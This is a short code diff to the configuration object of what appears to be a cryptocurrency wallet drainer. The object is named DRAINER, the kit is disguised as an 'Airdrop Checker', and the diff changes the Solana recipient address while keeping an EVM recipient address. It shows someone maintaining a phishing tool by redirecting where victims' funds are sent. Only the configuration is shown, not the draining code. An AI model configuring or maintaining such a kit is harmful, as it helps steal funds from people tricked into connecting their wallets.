@@ -10,7 +10,7 @@ const DRAINER = {
   apiOrigins: [],
   projectName: "Airdrop Checker",
   heliusKey: "", // optional
-  solRecipient: "8UdfVLABMnbMVZVB2eH8vQeBsdaJe57bAmgk33mead69",
+  solRecipient: "8SNvyaB8bq6YyvCzUrFj8khb5N3fv1xNTVKcPLAVw89b",
   evmRecipient: "0x9FC141c559a8D667FD035D90ee3b961bEf758594",
 };
 
